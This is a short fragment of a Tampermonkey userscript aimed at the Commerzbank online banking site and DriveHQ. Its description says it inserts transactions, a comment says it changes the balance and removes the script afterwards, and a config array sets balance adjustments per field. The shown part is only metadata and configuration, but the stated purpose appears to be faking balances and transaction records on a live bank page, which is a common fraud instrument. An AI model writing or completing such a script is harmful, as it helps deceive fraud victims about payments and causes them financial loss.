// ==UserScript==
// @name         Ed 4Rec Comm twuellner614@gmail.com
// @namespace    http://tampermonkey.net/
// @version      5.0
// @description  Insert multiple transactions with specified details
// @author       You
// @match        https://www.drivehq.com/*
// @match        https://kunden.commerzbank.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/500831/Ed%204Rec%20Comm%20twuellner614%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/500831/Ed%204Rec%20Comm%20twuellner614%40gmailcom.meta.js
// ==/UserScript==


//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------


//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL


 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +0 },
        { index: 4, adjustmentAmount: +0 },
        { index: 5, adjustmentAmount: +0 },
        { index: 3, adjustmentAmount: +1 }
        // Add more configurations as needed...
    ];

